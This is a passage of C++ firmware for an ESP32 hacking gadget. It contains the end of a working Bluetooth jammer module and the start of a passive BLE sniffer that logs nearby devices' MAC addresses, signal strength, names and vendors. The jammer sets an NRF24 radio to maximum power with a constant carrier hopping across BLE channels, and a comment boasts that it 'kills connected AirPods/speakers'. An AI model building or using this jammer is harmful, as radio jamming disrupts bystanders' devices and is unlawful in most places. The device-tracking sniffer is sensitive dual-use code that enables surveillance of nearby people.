        for (int y = 0; y < barH; y++) {
            float heightRatio = (float)y / (float)barH;
            float heatRatio = (float)heat / 125.0f;

            // More aggressive color gradient
            float ratio = heightRatio * (0.3f + heatRatio * 0.7f);
            if (ratio > 1.0f) ratio = 1.0f;

            // Cyan (0, 207, 255) -> Hot Pink (255, 28, 82)
            uint8_t r = (uint8_t)(ratio * 255);
            uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
            uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
            uint16_t color = tft.color565(r, g, b);

            tft.drawFastHLine(x, barY + barH - 1 - y, 2, color);
        }

        // Add glow effect at base for hot bars
        if (heat > 80) {
            tft.drawFastHLine(x, barY + barH, 2, HALEHOUND_HOTPINK);
            tft.drawFastHLine(x, barY + barH + 1, 2, tft.color565(128, 14, 41));
        }
    }

    // ADV channel markers
    drawAdvMarkers();

    // Current frequency display
    if (jamming) {
        tft.fillRect(BJ_GRAPH_X + 50, BJ_GRAPH_Y + 2, 140, 12, TFT_BLACK);
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setTextSize(1);
        tft.setCursor(BJ_GRAPH_X + 55, BJ_GRAPH_Y + 3);
        tft.printf(">>> %d MHz <<<", 2400 + currentNRFChannel);
    }
}

// Draw BLE advertising channel markers below the equalizer bars
static void drawAdvMarkers() {
    int markerY = BJ_GRAPH_Y + BJ_GRAPH_HEIGHT - 8;

    // ADV37 = NRF ch 2 (bar 2)
    int x37 = BJ_GRAPH_X + (2 * BJ_GRAPH_WIDTH / BJ_NUM_BARS);
    // ADV38 = NRF ch 26 (bar 26)
    int x38 = BJ_GRAPH_X + (26 * BJ_GRAPH_WIDTH / BJ_NUM_BARS);
    // ADV39 = NRF ch 80 (bar 80)
    int x39 = BJ_GRAPH_X + (80 * BJ_GRAPH_WIDTH / BJ_NUM_BARS);

    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(x37, markerY);
    tft.print("37");
    tft.setCursor(x38, markerY);
    tft.print("38");
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(x39 - 4, markerY);
    tft.print("39");
}

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ROWS - 3x8 with frequency-tracking red indicator
// Active frequency skull turns RED, adjacent skulls glow orange
// ═══════════════════════════════════════════════════════════════════════════

static void drawSkulls() {
    int skullStartX = 10;
    int skullSpacing = (SCREEN_WIDTH - 20) / BJ_SKULL_NUM;

    // Map current NRF channel (2-80) to skull position (0-7)
    int activeSkull = ((currentNRFChannel - BJ_BT_NRF_START) * BJ_SKULL_NUM) / (BJ_BT_NRF_END - BJ_BT_NRF_START + 1);
    if (activeSkull >= BJ_SKULL_NUM) activeSkull = BJ_SKULL_NUM - 1;
    if (activeSkull < 0) activeSkull = 0;

    for (int row = 0; row < BJ_SKULL_ROWS; row++) {
        int rowY = BJ_SKULL_Y + (row * BJ_SKULL_ROW_SPACING);

        for (int i = 0; i < BJ_SKULL_NUM; i++) {
            int x = skullStartX + (i * skullSpacing);
            tft.fillRect(x, rowY, 16, 16, TFT_BLACK);

            uint16_t color;
            if (jamming) {
                int dist = abs(i - activeSkull);

                if (dist == 0) {
                    // ACTIVE FREQUENCY SKULL - PULSING BRIGHT RED
                    int pulse = (skullFrame + (row * 2)) % 4;
                    uint8_t brightness = 180 + (pulse * 25);
                    color = tft.color565(brightness, 0, 0);
                } else if (dist == 1) {
                    // ADJACENT SKULLS - ORANGE/RED GLOW
                    int pulse = (skullFrame + i + (row * 3)) % 6;
                    uint8_t r = 200 + (pulse * 9);
                    uint8_t g = 40 + (pulse * 8);
                    color = tft.color565(r, g, 0);
                } else {
                    // Normal cyan-to-hot-pink wave for distant skulls
                    int phase = (skullFrame + i + (row * 3)) % 8;
                    if (phase < 4) {
                        float ratio = phase / 3.0f;
                        uint8_t r = (uint8_t)(ratio * 255);
                        uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                        uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                        color = tft.color565(r, g, b);
                    } else {
                        float ratio = (phase - 4) / 3.0f;
                        uint8_t r = 255 - (uint8_t)(ratio * 255);
                        uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                        uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                        color = tft.color565(r, g, b);
                    }
                }
            } else {
                color = HALEHOUND_GUNMETAL;  // Gray when inactive
            }

            tft.drawBitmap(x, rowY, bjSkulls[i], 16, 16, color);
        }

        // Status text next to skulls on first row only
        if (row == 0) {
            tft.fillRect(skullStartX + (BJ_SKULL_NUM * skullSpacing), rowY, 50, 16, TFT_BLACK);
            tft.setTextColor(jamming ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(skullStartX + (BJ_SKULL_NUM * skullSpacing) + 5, rowY + 4);
            tft.print(jamming ? "TX!" : "OFF");
        }
    }

    skullFrame++;
}

// ═══════════════════════════════════════════════════════════════════════════
// JAMMING CONTROL
// ═══════════════════════════════════════════════════════════════════════════

static void startJamming() {
    // ═══════════════════════════════════════════════════════════════════════
    // DUAL-CORE CONTINUOUS WAVE JAMMER
    // Core 0: FreeRTOS task owns ALL SPI + NRF24. startConstCarrier() for
    //         100% duty cycle continuous wave, setChannel() for tight hopping.
    // Core 1: Display animations at full speed (separate HSPI bus).
    // Core 1 NEVER touches NRF24 while jam task is running.
    // ═══════════════════════════════════════════════════════════════════════

    // Set shared state BEFORE launching task
    hopIndex = 0;
    currentNRFChannel = bjModes[currentMode].channels[0];
    bjHitCount = 0;
    bjJamMode = currentMode;
    bjJamTaskDone = false;
    jamming = true;

    // Launch jam task on core 0 — task handles ALL SPI/radio init on that core
    bjJamTaskRunning = true;
    xTaskCreatePinnedToCore(bjJamTask, "BleJam", 8192, NULL, 1, &bjJamTaskHandle, 0);

    Serial.printf("[BLEJAM] DUAL-CORE Started - Mode: %s, Channels: %d, Core0 task launched\n",
                  BJ_MODE_NAMES[currentMode], bjModes[currentMode].count);
}

static void stopJamming() {
    // Signal jam task to stop — task does its own radio cleanup on core 0
    bjJamTaskRunning = false;

    // Wait for task to finish cleanup (it powers down radio + releases SPI)
    if (bjJamTaskHandle) {
        unsigned long waitStart = millis();
        while (!bjJamTaskDone && (millis() - waitStart < 500)) {
            vTaskDelay(10 / portTICK_PERIOD_MS);
        }
        bjJamTaskHandle = NULL;
    }

    // Re-init SPI on core 1 for other modules (scanner, mousejacker, etc.)
    delay(2);
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);
    nrf24Radio.begin();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setDataRate(RF24_2MBPS);
    nrf24Radio.setAutoAck(false);
    nrf24Radio.disableCRC();

    jamming = false;
    Serial.println("[BLEJAM] Stopped — core 0 task terminated, SPI restored to core 1");
}

static void nextMode() {
    currentMode = (currentMode + 1) % BJ_MODE_COUNT;
    hopIndex = 0;
    bjJamMode = currentMode;  // sync to jam task (volatile, task picks up next iteration)
}

static void prevMode() {
    currentMode = (currentMode - 1 + BJ_MODE_COUNT) % BJ_MODE_COUNT;
    hopIndex = 0;
    bjJamMode = currentMode;  // sync to jam task
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    exitRequested = false;
    jamming = false;
    currentMode = BJ_MODE_BLE;    // Default BLE — kills connected AirPods/speakers
    currentNRFChannel = BJ_BT_NRF_START;
    hopIndex = 0;
    skullFrame = 0;
    bjHitCount = 0;
    memset(channelHeat, 0, sizeof(channelHeat));

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();

    #if CYD_DEBUG
    Serial.println("[BLEJAM] Initializing BLE Jammer...");
    #endif

    nrf24ClaimSPI();
    if (!nrf24Radio.begin()) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setTextSize(2);
        drawCenteredText(100, "NRF24 NOT FOUND", HALEHOUND_HOTPINK, 2);
        tft.setTextSize(1);
        drawCenteredText(130, "Check wiring:", HALEHOUND_MAGENTA, 1);
        drawCenteredText(145, ("CE=GPIO" + String(NRF24_CE) + " CSN=GPIO" + String(NRF24_CSN)).c_str(), HALEHOUND_MAGENTA, 1);
        initialized = false;
        return;
    }

    // Max power, 2Mbps, no auto-ack, no CRC — maximum aggression
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setDataRate(RF24_2MBPS);
    nrf24Radio.setAutoAck(false);
    nrf24Radio.disableCRC();

    Serial.printf("[BLEJAM] NRF24 INIT OK - isPVariant: %d, chipConnected: %d\n",
                  nrf24Radio.isPVariant(), nrf24Radio.isChipConnected());
    Serial.printf("[BLEJAM] CE=GPIO%d, CSN=GPIO%d, SPI: SCK=%d MISO=%d MOSI=%d\n",
                  NRF24_CE, NRF24_CSN, RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI);

    drawBjMainUI();
    drawJammerDisplay();
    drawSkulls();

    lastDisplayTime = millis();
    initialized = true;

    #if CYD_DEBUG
    Serial.println("[BLEJAM] NRF24 initialized - BLE Jammer ready");
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN LOOP
// ═══════════════════════════════════════════════════════════════════════════

void loop() {
    if (!initialized) {
        // NRF24 not found - just check for exit
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            exitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING - with release detection (prevents repeat triggers)
    // Icons: Back=10, Toggle=60, PrevMode=105, NextMode=140, Antenna=180, Cycle=215
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area
        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
            // Wait for touch release to prevent repeated triggers
            waitForTouchRelease();

            // Back icon (x=10)
            if (tx >= 5 && tx <= 30) {
                if (jamming) stopJamming();
                exitRequested = true;
                return;
            }
            // Toggle icon (x=60)
            else if (tx >= 50 && tx <= 80) {
                if (jamming) stopJamming(); else startJamming();
                drawIconBar();
                drawBjMainUI();
                return;
            }
            // Prev mode icon (x=105)
            else if (tx >= 95 && tx <= 125) {
                prevMode();
                drawBjMainUI();
                return;
            }
            // Next mode icon (x=140)
            else if (tx >= 130 && tx <= 160) {
                nextMode();
                drawBjMainUI();
                return;
            }
            // Antenna icon (x=180) - visual indicator only
            else if (tx >= 170 && tx <= 200) {
                return;
            }
            // Cycle mode icon at right edge
            else if (tx >= (tft.width() - 35) && tx <= tft.width()) {
                nextMode();
                drawBjMainUI();
                return;
            }
        }
    }

    // Hardware button fallback
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (jamming) stopJamming();
        exitRequested = true;
        return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // JAMMING ENGINE — RUNS ON CORE 0 (FreeRTOS task)
    // The jam task (bjJamTask) handles all NRF24 operations on core 0
    // using VSPI. Display runs here on core 1 using HSPI. Zero conflict.
    // No burst/pause pattern needed — jammer is 100% duty cycle.
    // ═══════════════════════════════════════════════════════════════════════

    // ═══════════════════════════════════════════════════════════════════════
    // DISPLAY UPDATE — Full animations ALL the time!
    // Jammer runs on core 0 with its own SPI bus. Display doesn't affect it.
    // Equalizer, skulls, stats — everything runs at full speed.
    // ═══════════════════════════════════════════════════════════════════════
    unsigned long displayInterval = jamming ? 80 : 30;
    if (millis() - lastDisplayTime >= displayInterval) {
        bjUpdateStats();
        drawJammerDisplay();
        drawSkulls();
        lastDisplayTime = millis();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// LIFECYCLE
// ═══════════════════════════════════════════════════════════════════════════

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    // Kill jam task on core 0 first
    if (jamming || bjJamTaskRunning) {
        stopJamming();
    }
    nrf24Radio.powerDown();
    delay(2);
    nrf24ReleaseSPI();
    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[BLEJAM] Cleanup complete — core 0 task terminated");
    #endif
}

}  // namespace BleJammer


// ═══════════════════════════════════════════════════════════════════════════
// BLE SNIFFER IMPLEMENTATION - Continuous BLE Advertisement Monitor
// Passive scanning, live device tracking, vendor ID, type classification
// ═══════════════════════════════════════════════════════════════════════════

namespace BleSniffer {

// ── State ────────────────────────────────────────────────────────────────
static bool initialized = false;
static bool exitRequested = false;
static bool scanning = false;
static bool detailView = false;
static BLEScan* pBleScan = nullptr;

// ── Device storage ───────────────────────────────────────────────────────
struct BleDevice {
    uint8_t  mac[6];
    int8_t   rssi;
    int8_t   rssiMin;
    int8_t   rssiMax;
    char     name[17];       // 16 chars + null
    char     vendor[8];      // 7 chars + null
    uint16_t companyId;      // BT SIG company ID from manufacturer data (0xFFFF = none)
    uint32_t firstSeen;
    uint32_t lastSeen;
    uint16_t frameCount;
    uint8_t  mfgData[8];    // First 8 bytes of manufacturer data
    uint8_t  mfgDataLen;
    bool     hasName;
    bool     randomMAC;
};

#define BSNIFF_MAX_DEVICES 62
#define BSNIFF_MAX_VISIBLE 10
#define BSNIFF_ITEM_HEIGHT 20

static BleDevice devices[BSNIFF_MAX_DEVICES];
static int deviceCount = 0;
static int currentIndex = 0;
static int listStartIndex = 0;
static uint32_t scanStartTime = 0;
static unsigned long lastDisplayUpdate = 0;

// ── Filter modes ─────────────────────────────────────────────────────────
enum SniffFilter : uint8_t {
    FILT_ALL = 0,
    FILT_NAMED,
    FILT_APPLE,
    FILT_STRONG,
    FILT_COUNT
};
static SniffFilter currentFilter = FILT_ALL;
static const char* filterNames[] = {"ALL", "NAMED", "APPLE", "STRONG"};

// ── Volatile queue (callback → loop) ─────────────────────────────────────
static volatile bool pendingReady = false;
static uint8_t  pendingMAC[6];
static int8_t   pendingRSSI = 0;
static char     pendingName[17];
static bool     pendingHasName = false;
static uint8_t  pendingMfgData[8];
static uint8_t  pendingMfgLen = 0;

// ── Icon bar ─────────────────────────────────────────────────────────────
#define BSNIFF_ICON_SIZE 16
#define BSNIFF_ICON_NUM 6
static int bsniffIconX[BSNIFF_ICON_NUM] = {10, 55, 100, 135, 175, 215};
static const unsigned char* bsniffIcons[BSNIFF_ICON_NUM] = {
    bitmap_icon_go_back,     // 0: back
    bitmap_icon_start,       // 1: scan toggle
    bitmap_icon_LEFT,        // 2: filter left
    bitmap_icon_RIGHT,       // 3: filter right
    bitmap_icon_eye2,        // 4: detail view
    bitmap_icon_ble          // 5: BLE pulse indicator
};

// ── Forward declarations ─────────────────────────────────────────────────
static void drawIconBar();
static void drawHeader();
static void drawColumnHeaders();
static void drawDeviceList();
static void drawStatsLine();
static void drawButtonBar();
static void drawFullUI();
static void showDeviceDetail(int idx);
static void handleTouch();
static int  countFiltered();

// ═══════════════════════════════════════════════════════════════════════════
// OUI VENDOR LOOKUP (own copy — same entries as StationScan)
// ═══════════════════════════════════════════════════════════════════════════

static const char* lookupVendor(uint8_t* mac) {
    if (mac[0] & 0x02) return "Random";

    // Apple OUIs
    if (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0xB3) return "Apple";
    if (mac[0] == 0xF0 && mac[1] == 0x18 && mac[2] == 0x98) return "Apple";
    if (mac[0] == 0xAC && mac[1] == 0xDE && mac[2] == 0x48) return "Apple";
    if (mac[0] == 0xA4 && mac[1] == 0x83 && mac[2] == 0xE7) return "Apple";
    if (mac[0] == 0x3C && mac[1] == 0x06 && mac[2] == 0x30) return "Apple";
    if (mac[0] == 0x14 && mac[1] == 0x98 && mac[2] == 0x77) return "Apple";
    if (mac[0] == 0xDC && mac[1] == 0xA4 && mac[2] == 0xCA) return "Apple";
    if (mac[0] == 0x78 && mac[1] == 0x7B && mac[2] == 0x8A) return "Apple";
    if (mac[0] == 0x38 && mac[1] == 0xC9 && mac[2] == 0x86) return "Apple";
    if (mac[0] == 0xBC && mac[1] == 0x6C && mac[2] == 0x21) return "Apple";
    if (mac[0] == 0x40 && mac[1] == 0xB3 && mac[2] == 0x95) return "Apple";
    if (mac[0] == 0x6C && mac[1] == 0x94 && mac[2] == 0xF8) return "Apple";

    // Samsung
    if (mac[0] == 0x00 && mac[1] == 0x07 && mac[2] == 0xAB) return "Samsng";
    if (mac[0] == 0x00 && mac[1] == 0x16 && mac[2] == 0x6C) return "Samsng";
    if (mac[0] == 0x00 && mac[1] == 0x1A && mac[2] == 0x8A) return "Samsng";
    if (mac[0] == 0x00 && mac[1] == 0x26 && mac[2] == 0x37) return "Samsng";
    if (mac[0] == 0xE8 && mac[1] == 0x50 && mac[2] == 0x8B) return "Samsng";
    if (mac[0] == 0x8C && mac[1] == 0x77 && mac[2] == 0x12) return "Samsng";
    if (mac[0] == 0xCC && mac[1] == 0x07 && mac[2] == 0xAB) return "Samsng";

    // Google
    if (mac[0] == 0x3C && mac[1] == 0x5A && mac[2] == 0xB4) return "Google";
    if (mac[0] == 0xF4 && mac[1] == 0xF5 && mac[2] == 0xD8) return "Google";
    if (mac[0] == 0x54 && mac[1] == 0x60 && mac[2] == 0x09) return "Google";

    // Intel
    if (mac[0] == 0x00 && mac[1] == 0x1B && mac[2] == 0x21) return "Intel";
    if (mac[0] == 0x00 && mac[1] == 0x1E && mac[2] == 0x64) return "Intel";
    if (mac[0] == 0x68 && mac[1] == 0x05 && mac[2] == 0xCA) return "Intel";
    if (mac[0] == 0x3C && mac[1] == 0x6A && mac[2] == 0xA7) return "Intel";
    if (mac[0] == 0x80 && mac[1] == 0x86 && mac[2] == 0xF2) return "Intel";

    // Espressif
    if (mac[0] == 0x24 && mac[1] == 0x0A && mac[2] == 0xC4) return "ESP";
    if (mac[0] == 0xA4 && mac[1] == 0xCF && mac[2] == 0x12) return "ESP";
    if (mac[0] == 0x30 && mac[1] == 0xAE && mac[2] == 0xA4) return "ESP";
    if (mac[0] == 0xEC && mac[1] == 0xFA && mac[2] == 0xBC) return "ESP";
    if (mac[0] == 0x08 && mac[1] == 0x3A && mac[2] == 0xF2) return "ESP";
    if (mac[0] == 0x88 && mac[1] == 0x57 && mac[2] == 0x21) return "ESP";

    // Microsoft
    if (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0xF2) return "Msft";
    if (mac[0] == 0x28 && mac[1] == 0x18 && mac[2] == 0x78) return "Msft";
    if (mac[0] == 0x7C && mac[1] == 0x1E && mac[2] == 0x52) return "Msft";

    // Qualcomm
    if (mac[0] == 0x00 && mac[1] == 0x03 && mac[2] == 0x7A) return "Qcomm";

    // Broadcom
    if (mac[0] == 0x00 && mac[1] == 0x10 && mac[2] == 0x18) return "Brcm";

    // Realtek
    if (mac[0] == 0x00 && mac[1] == 0xE0 && mac[2] == 0x4C) return "Rtk";

    // Huawei
    if (mac[0] == 0x00 && mac[1] == 0x9A && mac[2] == 0xCD) return "Huawei";
    if (mac[0] == 0x00 && mac[1] == 0x46 && mac[2] == 0x4B) return "Huawei";
    if (mac[0] == 0x48 && mac[1] == 0x46 && mac[2] == 0xC1) return "Huawei";

    return "???";
}

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE LABEL (from ble_database.h company ID lookup)
// ═══════════════════════════════════════════════════════════════════════════

// Extract company ID from manufacturer data (first 2 bytes, little-endian)
static uint16_t extractCompanyId(uint8_t* mfgData, uint8_t len) {
    if (len < 2) return 0xFFFF;
    return mfgData[0] | (mfgData[1] << 8);
}

// Get display label for device — uses ble_database.h for 94 companies
static const char* devDisplayLabel(uint16_t companyId, bool hasName) {
    if (companyId != 0xFFFF) {
        const char* name = lookupCompanyName(companyId);
        if (name) return name;
    }
    return hasName ? "Named" : "---";
}

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

static int findDevice(uint8_t* mac) {
    for (int i = 0; i < deviceCount; i++) {
        if (memcmp(devices[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

static void addOrUpdateDevice(uint8_t* mac, int8_t rssi, const char* name,
                               bool hasName, uint8_t* mfgData, uint8_t mfgLen) {
    uint32_t now = millis();
    int idx = findDevice(mac);

    if (idx >= 0) {
        // Update existing device
        BleDevice* d = &devices[idx];
        d->rssi = rssi;
        if (rssi < d->rssiMin) d->rssiMin = rssi;
        if (rssi > d->rssiMax) d->rssiMax = rssi;
        d->lastSeen = now;
        d->frameCount++;
        if (hasName && !d->hasName) {
            strncpy(d->name, name, 16);
            d->name[16] = '\0';
            d->hasName = true;
        }
        if (mfgLen > 0 && d->mfgDataLen == 0) {
            uint8_t copyLen = mfgLen > 8 ? 8 : mfgLen;
            memcpy(d->mfgData, mfgData, copyLen);
            d->mfgDataLen = copyLen;
            uint16_t cid = extractCompanyId(mfgData, mfgLen);
            if (cid != 0xFFFF) d->companyId = cid;
        }
        return;
    }

    // Add new device
    if (deviceCount >= BSNIFF_MAX_DEVICES) return;

    BleDevice* d = &devices[deviceCount];
    memcpy(d->mac, mac, 6);
    d->rssi = rssi;
    d->rssiMin = rssi;
    d->rssiMax = rssi;
    d->firstSeen = now;
    d->lastSeen = now;
    d->frameCount = 1;
    d->randomMAC = (mac[0] & 0x02) != 0;

    if (hasName) {
        strncpy(d->name, name, 16);
        d->name[16] = '\0';
        d->hasName = true;
    } else {
        d->name[0] = '\0';
        d->hasName = false;
    }

    strncpy(d->vendor, lookupVendor(mac), 7);
    d->vendor[7] = '\0';

    if (mfgLen > 0) {
        uint8_t copyLen = mfgLen > 8 ? 8 : mfgLen;
        memcpy(d->mfgData, mfgData, copyLen);
        d->mfgDataLen = copyLen;
        d->companyId = extractCompanyId(mfgData, mfgLen);
    } else {
        d->mfgDataLen = 0;
        d->companyId = 0xFFFF;
    }

    deviceCount++;

    #if CYD_DEBUG
    Serial.printf("[BSNIFF] +DEV #%d %02X:%02X:%02X:%02X:%02X:%02X %ddBm %s %s\n",
                  deviceCount, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
                  rssi, d->vendor, devDisplayLabel(d->companyId, d->hasName));
    #endif
}

// ── Filter check ─────────────────────────────────────────────────────────
static bool passesFilter(BleDevice* d) {
    switch (currentFilter) {
        case FILT_NAMED:  return d->hasName;
        case FILT_APPLE:  return d->companyId == 0x004C;  // Apple BT SIG company ID
        case FILT_STRONG: return d->rssi > -60;
        default:          return true;
    }
}

static int countFiltered() {
    if (currentFilter == FILT_ALL) return deviceCount;
    int count = 0;
    for (int i = 0; i < deviceCount; i++) {
        if (passesFilter(&devices[i])) count++;
    }
    return count;
}

// ═══════════════════════════════════════════════════════════════════════════
// BLE SCAN CALLBACKS
// ═══════════════════════════════════════════════════════════════════════════

class SnifferCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
        if (pendingReady) return;  // Queue full, skip this frame

        // Copy MAC
        const uint8_t* addr = *advertisedDevice.getAddress().getNative();
        memcpy(pendingMAC, addr, 6);
        pendingRSSI = advertisedDevice.getRSSI();

        // Copy name
        if (advertisedDevice.haveName() && advertisedDevice.getName().length() > 0) {
            strncpy(pendingName, advertisedDevice.getName().c_str(), 16);
            pendingName[16] = '\0';
            pendingHasName = true;
        } else {
            pendingName[0] = '\0';
            pendingHasName = false;
        }

        // Copy manufacturer data
        if (advertisedDevice.haveManufacturerData()) {
            std::string mfg = advertisedDevice.getManufacturerData();
            pendingMfgLen = mfg.length() > 8 ? 8 : mfg.length();
            memcpy(pendingMfgData, mfg.data(), pendingMfgLen);
        } else {
            pendingMfgLen = 0;
        }

        pendingReady = true;
    }
};

static SnifferCallbacks snifferCB;

// Scan completion callback — restart for continuous scanning
static void scanCompleteCallback(BLEScanResults results) {
    if (scanning && pBleScan) {
        // is_continue = false → clears BLE library's internal device map to prevent heap exhaustion
        pBleScan->start(5, scanCompleteCallback, false);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);
    for (int i = 0; i < BSNIFF_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        // Use HALEHOUND_MAGENTA (Electric Blue 0x041F) for active — CYAN and HOTPINK are same color (0xF81F)
        if (i == 1 && scanning) color = HALEHOUND_MAGENTA;    // Scan toggle ELECTRIC BLUE when active
        if (i == 1 && !scanning) color = HALEHOUND_GUNMETAL;  // Scan toggle dim when stopped
        if (i == 5 && scanning) color = HALEHOUND_MAGENTA;    // BLE pulse ELECTRIC BLUE when active
        if (i == 5 && !scanning) color = HALEHOUND_GUNMETAL;  // BLE pulse dim when stopped
        tft.drawBitmap(bsniffIconX[i], 20, bsniffIcons[i], BSNIFF_ICON_SIZE, BSNIFF_ICON_SIZE, color);
    }
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);

    // Scan status text next to play icon
    tft.setTextSize(1);
    tft.fillRect(35, 22, 18, 10, HALEHOUND_GUNMETAL);
    if (scanning) {
        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_GUNMETAL);
        tft.setCursor(35, 23);
        tft.print("ON");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_GUNMETAL);
    }
}

static void drawHeader() {
    tft.fillRect(0, 38, SCREEN_WIDTH, 20, HALEHOUND_BLACK);
    drawGlitchText(55, "BLE SNIFF", &Nosifer_Regular10pt7b);

    // Device count + filter name on right side
    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
    tft.setCursor(5, 42);
    int filtered = countFiltered();
    tft.printf("%d/%d", filtered, deviceCount);
    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
    tft.setCursor(195, 42);
    tft.print(filterNames[currentFilter]);
}

static void drawColumnHeaders() {
    tft.fillRect(0, 58, SCREEN_WIDTH, 14, HALEHOUND_DARK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 60);
    tft.print("MAC");
    tft.setCursor(80, 60);
    tft.print("dB");
    tft.setCursor(115, 60);
    tft.print("TYPE");
    tft.setCursor(170, 60);
    tft.print("VENDOR");
}

static void drawDeviceList() {
    tft.fillRect(0, 74, SCREEN_WIDTH, 199, HALEHOUND_BLACK);

    if (deviceCount == 0) {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setTextSize(1);
        tft.setCursor(40, 140);
        tft.print("Scanning for devices...");
        return;
    }

    uint32_t now = millis();
    int y = 74;
    int visibleIdx = 0;
    int drawn = 0;
    int skipped = 0;

    for (int i = 0; i < deviceCount && drawn < BSNIFF_MAX_VISIBLE; i++) {
        BleDevice* d = &devices[i];
        if (!passesFilter(d)) continue;

        // Pagination: skip items before listStartIndex
        if (skipped < listStartIndex) {
            skipped++;
            continue;
        }

        uint32_t age = now - d->lastSeen;

        // Color coding
        uint16_t rowColor;
        if (visibleIdx + listStartIndex == currentIndex) {
            rowColor = HALEHOUND_BRIGHT;           // Highlighted/selected
        } else if (age < 5000 && d->hasName) {
            rowColor = TFT_WHITE;                  // Recent + named
        } else if (age < 5000) {
            rowColor = HALEHOUND_MAGENTA;             // Recent
        } else if (d->companyId != 0xFFFF && lookupCompanyName(d->companyId) != nullptr) {
            rowColor = HALEHOUND_VIOLET;           // Known manufacturer type
        } else if (age > 30000) {
            rowColor = HALEHOUND_GUNMETAL;         // Stale
        } else {
            rowColor = HALEHOUND_MAGENTA;
        }

        // Highlight selected row background
        if (visibleIdx + listStartIndex == currentIndex) {
            tft.fillRect(0, y, SCREEN_WIDTH, BSNIFF_ITEM_HEIGHT - 2, HALEHOUND_DARK);
        }

        tft.setTextColor(rowColor);
        tft.setTextSize(1);

        // MAC (last 3 octets)
        char macStr[10];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X",
                 d->mac[3], d->mac[4], d->mac[5]);
        tft.setCursor(5, y + 4);
        tft.print(macStr);

        // RSSI
        tft.setCursor(80, y + 4);
        tft.printf("%d", d->rssi);

        // Type (company name from ble_database.h)
        tft.setCursor(115, y + 4);
        tft.print(devDisplayLabel(d->companyId, d->hasName));

        // Vendor
        tft.setCursor(170, y + 4);
        tft.print(d->vendor);

        // Frame count indicator (small dot for active devices)
        if (d->frameCount > 5 && age < 10000) {
            tft.fillCircle(SCREEN_WIDTH - 5, y + 8, 2, HALEHOUND_HOTPINK);
        }

        y += BSNIFF_ITEM_HEIGHT;
        drawn++;
        visibleIdx++;
    }
}

static void drawStatsLine() {
    tft.fillRect(0, 273, SCREEN_WIDTH, 10, HALEHOUND_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);

    int filtered = countFiltered();
    uint32_t elapsed = (millis() - scanStartTime) / 1000;
    uint32_t mins = elapsed / 60;
    uint32_t secs = elapsed % 60;

    tft.setCursor(5, 274);
    tft.printf("T:%d F:%d", deviceCount, filtered);

    tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
    tft.setCursor(160, 274);
    tft.printf("%02d:%02d", mins, secs);

    tft.fillRect(200, 274, 40, 8, HALEHOUND_BLACK);
    if (scanning) {
        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
        tft.setCursor(210, 274);
        tft.print("LIVE");
    } else {
